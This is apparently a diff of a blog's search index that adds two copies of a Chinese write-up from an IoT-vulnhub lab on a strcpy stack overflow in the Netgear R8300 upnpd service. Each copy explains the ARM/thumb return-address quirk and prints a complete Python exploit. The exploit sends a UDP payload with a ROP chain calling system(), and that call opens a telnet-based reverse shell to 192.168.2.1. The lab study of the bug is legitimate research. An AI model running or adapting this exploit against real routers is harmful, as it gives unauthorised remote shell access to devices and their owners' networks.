@@ -1,6 +1,50 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title></title>
+    <url>/2020/11/12/R8300/</url>
+    <content><![CDATA[<p>继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包</p>
+<p><img src="/2020/11/12/R8300/image-20201112105313699.png" alt="image-20201112105313699"></p>
+<p><img src="/2020/11/12/R8300/image-20201112105352444.png" alt="image-20201112105352444"></p>
+<p>从中可以看到upnp会为接收到的数据创造一个0x1FFFu的内存，这片内存空间的地址而进入到vuln函数后通过strcpy传递到栈上,而该漏洞函数的栈空间大小只有0x658，所以完全足够覆盖返回地址。</p>
+<p>利用给的POC，可以得到覆盖后的地址显示为“CCCB”，确实覆盖了函数地址但仔细发现POC构造的数据为“CCCC”，传递过去后会莫名奇妙的减1，通过查询资料可以了解到在arm架构中有两种模式arm和thumb模式，这两种模式可以同时存在于程序中，其中arm模式的指令为四字节，thumb模式指令为两字节，两种模式转换要通过bx指令，当bx指向的内容最低位为1表示thumb，为0表示arm。当程序出现异常时会转换成arm模式也就是会将最低位置0，所以将构造的payload设置位“BBBB”，返回地址显示的也是“BBBB”。</p>
+<p>由于只给了POC脚本，根据网上查阅的信息该类设备通常开了ASLR，所以要利用堆栈重用攻击构造ROP链，可以参考<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/%EF%BC%8C%E6%88%91%E5%9C%A8%E8%B0%83%E8%AF%95%E5%B0%B1%E6%8A%8AASLR%E5%85%B3%E4%BA%86%EF%BC%8C%E7%A8%8D%E5%BE%AE%E7%AE%80%E5%8D%95%E7%82%B9%E3%80%82">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/，我在调试就把ASLR关了，稍微简单点。</a></p>
+<p>在构造payload过程中要注意v51是一个指针型变量，所以它指向的空间必须是存在的，因此要赋给它一个存在的地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">libc_base&#x3D;0x76dd0000</span><br><span class="line">stack_base&#x3D;0x7effdb8c</span><br><span class="line">p32 &#x3D; lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload &#x3D; (</span><br><span class="line">    0x604 * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x7effa53c) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x76e0db80) +     #pop &#123;r0,pc&#125;</span><br><span class="line">    p32(0x7effdbcc) +    #stack_base+0x40指向命令地址</span><br><span class="line">    p32(0x76e2a270) + #&amp;system</span><br><span class="line">    b&quot;pwd;&quot;*80+b&quot;telnet 192.168.2.1 8080 | &#x2F;bin&#x2F;sh | telnet 192.168.2.1 1080&quot;  # pwd;*80用作缓冲</span><br><span class="line">)</span><br><span class="line">s.connect((&#39;192.168.2.2&#39;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.recvfrom(1024)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>由于靶机上没有nc命令但有telnet命令，因此尝试用telnet反弹shell，主机上开两个窗口</p>
+<p>分别监听1080和8080端口，一个窗口用作命令执行，一个窗口用作回显</p>
+<p><img src="/2020/11/12/R8300/image-20201112144508723.png" alt="image-20201112144508723"></p>
+]]></content>
+      <tags>
+        <tag>over-flow</tag>
+        <tag>upnp</tag>
+        <tag>darm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IoT-vulnhub:Netgear-R8300</title>
+    <url>/2020/11/12/IoT-vulnhub-Netgear-R8300/</url>
+    <content><![CDATA[<p>继vivotek摄像头调试成功后，在IoT-vulnhub平台调试的第二个洞，这是一个由于strcpy导致栈溢出的洞，处理的数据是upnp服务接收的UDP数据包</p>
+<p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112105313699.png" alt="image-20201112105313699"></p>
+<p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112105352444.png" alt="image-20201112105352444"></p>
+<p>从中可以看到upnp会为接收到的数据创造一个0x1FFFu的内存，这片内存空间的地址而进入到vuln函数后通过strcpy传递到栈上,而该漏洞函数的栈空间大小只有0x658，所以完全足够覆盖返回地址。</p>
+<p>利用给的POC，可以得到覆盖后的地址显示为“CCCB”，确实覆盖了函数地址但仔细发现POC构造的数据为“CCCC”，传递过去后会莫名奇妙的减1，通过查询资料可以了解到在arm架构中有两种模式arm和thumb模式，这两种模式可以同时存在于程序中，其中arm模式的指令为四字节，thumb模式指令为两字节，两种模式转换要通过bx指令，当bx指向的内容最低位为1表示thumb，为0表示arm。当程序出现异常时会转换成arm模式也就是会将最低位置0，所以将构造的payload设置位“BBBB”，返回地址显示的也是“BBBB”。</p>
+<p>由于只给了POC脚本，根据网上查阅的信息该类设备通常开了ASLR，所以要利用堆栈重用攻击构造ROP链，可以参考<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/%EF%BC%8C%E6%88%91%E5%9C%A8%E8%B0%83%E8%AF%95%E5%B0%B1%E6%8A%8AASLR%E5%85%B3%E4%BA%86%EF%BC%8C%E7%A8%8D%E5%BE%AE%E7%AE%80%E5%8D%95%E7%82%B9%E3%80%82">https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/，我在调试就把ASLR关了，稍微简单点。</a></p>
+<p>在构造payload过程中要注意v51是一个指针型变量，所以它指向的空间必须是存在的，因此要赋给它一个存在的地址。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">libc_base&#x3D;0x76dd0000</span><br><span class="line">stack_base&#x3D;0x7effdb8c</span><br><span class="line">p32 &#x3D; lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload &#x3D; (</span><br><span class="line">    0x604 * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x7effa53c) +  # v41</span><br><span class="line">    (0x634 - 0x604 - 8) * b&#39;a&#39; +  # dummy</span><br><span class="line">    p32(0x76e0db80) +     #pop &#123;r0,pc&#125;</span><br><span class="line">    p32(0x7effdbcc) +    #stack_base+0x40指向命令地址</span><br><span class="line">    p32(0x76e2a270) + #&amp;system</span><br><span class="line">    b&quot;pwd;&quot;*80+b&quot;telnet 192.168.2.1 8080 | &#x2F;bin&#x2F;sh | telnet 192.168.2.1 1080&quot;  # pwd;*80用作缓冲</span><br><span class="line">)</span><br><span class="line">s.connect((&#39;192.168.2.2&#39;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.recvfrom(1024)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>由于靶机上没有nc命令但有telnet命令，因此尝试用telnet反弹shell，主机上开两个窗口</p>
+<p>分别监听1080和8080端口，一个窗口用作命令执行，一个窗口用作回显</p>
+<p><img src="/2020/11/12/IoT-vulnhub-Netgear-R8300/image-20201112144508723.png" alt="image-20201112144508723"></p>
+]]></content>
+      <tags>
+        <tag>over-flow</tag>
+        <tag>upnp</tag>
+        <tag>darm</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>UnravelMFC</title>
     <url>/2020/11/03/UnravelMFC/</url>
     <content><![CDATA[<p>XNUCA实在是太难了，连这个XNUCA做出来人数最多的一题我都做了接近两天才弄出来，还是太菜了。</p>
